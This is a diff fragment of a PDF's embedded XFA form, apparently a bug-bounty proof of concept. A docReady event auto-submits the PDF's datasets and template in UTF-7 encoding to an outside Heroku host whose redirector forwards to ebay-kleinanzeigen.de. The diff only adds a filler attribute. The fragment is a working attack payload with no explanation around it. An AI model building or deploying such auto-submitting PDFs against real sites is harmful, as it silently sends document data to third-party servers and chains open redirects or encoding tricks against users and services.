@@ -18,6 +18,7 @@ stream
         <field id="Hello World!">
             <event activity="docReady" ref="$host" name="event__click">
                <submit 
+                     xxxxx="ddddd"
                      textEncoding="UTF-7"
                      xdpContent="pdf datasets template"
                      target="https://bughunt1307.herokuapp.com/redirector.php?x=https://www.ebay-kleinanzeigen.de/info.jsp"/>
